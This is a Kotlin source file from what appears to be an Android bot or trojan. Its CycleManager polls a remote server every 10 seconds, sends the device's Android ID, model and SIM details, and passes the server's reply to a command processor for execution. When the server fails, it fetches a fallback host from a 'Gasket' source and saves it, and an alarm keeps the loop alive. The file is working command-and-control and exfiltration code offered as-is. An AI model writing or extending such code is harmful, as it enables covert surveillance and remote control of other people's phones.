package org.reddeaddeath.classicbotmazar.network

import android.content.Context
import android.util.Log
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import org.json.JSONObject
import org.reddeaddeath.classicbotmazar.Constants
import org.reddeaddeath.classicbotmazar.UtilsMain
import org.reddeaddeath.classicbotmazar.commands.CommandProcessor
import org.reddeaddeath.classicbotmazar.device.DeviceInfoManager

object CycleManager {
    private const val TAG = "CycleManager"
    private const val MAX_FAILURES_BEFORE_GASKET = 2
    
    private var cycleJob: Job? = null
    private var connectionFailureCount = 0

    fun cycleServer(context: Context) {
        Log.d(TAG, "Starting cycleServer...")
        cycleJob?.cancel()
        cycleJob = CoroutineScope(Dispatchers.IO).launch {
            Log.d(TAG, "Cycle server coroutine started")
            while (true) {
                try {
                    performCycleIteration(context)
                } catch (e: Exception) {
                    Log.d(TAG, "Exception in cycle iteration: ${e.message}")
                }

                Log.d(TAG, "Waiting 10 seconds before next cycle...")
                delay(10000)
            }
        }
    }

    fun stopCycleServer() {
        Log.d(TAG, "Stopping cycle server...")
        cycleJob?.cancel()
        cycleJob = null
        connectionFailureCount = 0
        Log.d(TAG, "Cycle server stopped")
    }

    private fun performCycleIteration(context: Context) {
        Log.d(TAG, "=== Cycle iteration started ===")
        UtilsMain.startAlarm(context, 120000, 1)
        Log.d(TAG, "Alarm started")
        
        val deviceInfo = DeviceInfoManager.getDevice(context)
        val jsonData = createDeviceInfoJson(deviceInfo)

        var host = HostManager.getHost(context)
        var url = "$host${Constants.API_KEY}"
        Log.d(TAG, "Attempting connection to: $url")
        var (responseCode, responseBody) = NetworkManager.sendHTTPConnection(url, jsonData)

        if (responseCode == null || responseCode !in 200..299) {
            val (retryCode, retryBody) = handleConnectionFailure(context, jsonData, responseCode)
            responseCode = retryCode
            responseBody = retryBody
        } else {
            Log.d(TAG, "Connection successful with response code: $responseCode")
            connectionFailureCount = 0
            Log.d(TAG, "Resetting failure count")
        }
        
        if (responseBody != null && responseCode in 200..299) {
            CommandProcessor.processServerResponse(context, responseBody)
        }
        
        Log.d(TAG, "=== Cycle iteration completed ===")
    }

    private fun createDeviceInfoJson(deviceInfo: org.reddeaddeath.classicbotmazar.DeviceInfo): JSONObject {
        val deviceInfoJson = JSONObject().apply {
            put("android_id", deviceInfo.androidId)
            put("model", deviceInfo.model)
            put("sim1", deviceInfo.sim1)
            put("sim2", deviceInfo.sim2)
        }
        val jsonData = JSONObject().apply {
            put("device-info", deviceInfoJson)
        }
        Log.d(TAG, "JSON data prepared")
        return jsonData
    }

    private fun handleConnectionFailure(context: Context, jsonData: JSONObject, responseCode: Int?): Pair<Int?, String?> {
        connectionFailureCount++
        Log.d(TAG, "Connection failed or invalid response code: $responseCode, failure count: $connectionFailureCount")
        
        if (connectionFailureCount >= MAX_FAILURES_BEFORE_GASKET) {
            return tryConnectWithGasket(context, jsonData)
        }
        return Pair(responseCode, null)
    }

    private fun tryConnectWithGasket(context: Context, jsonData: JSONObject): Pair<Int?, String?> {
        Log.d(TAG, "Reached $MAX_FAILURES_BEFORE_GASKET failures, trying Gasket...")
        val newHost = HostManager.getHostFromGasket(context)
        if (newHost != null) {
            Log.d(TAG, "Got new host from Gasket: $newHost")
            
            if (HostManager.verifyHostWithGet(newHost)) {
                Log.d(TAG, "Host verified successfully, saving: $newHost")
                HostManager.saveHost(context, newHost)
            } else {
                Log.d(TAG, "Host verification failed: $newHost")
            }
            
            val url = "$newHost${Constants.API_KEY}"
            Log.d(TAG, "Retrying connection to: $url")
            val (retryCode, retryBody) = NetworkManager.sendHTTPConnection(url, jsonData)
            Log.d(TAG, "Retry response code: $retryCode")
            
            if (retryCode != null && retryCode in 200..299) {
                connectionFailureCount = 0
                Log.d(TAG, "Connection successful, resetting failure count")
            }
            return Pair(retryCode, retryBody)
        } else {
            Log.d(TAG, "Failed to get new host from Gasket")
            return Pair(null, null)
        }
    }
}

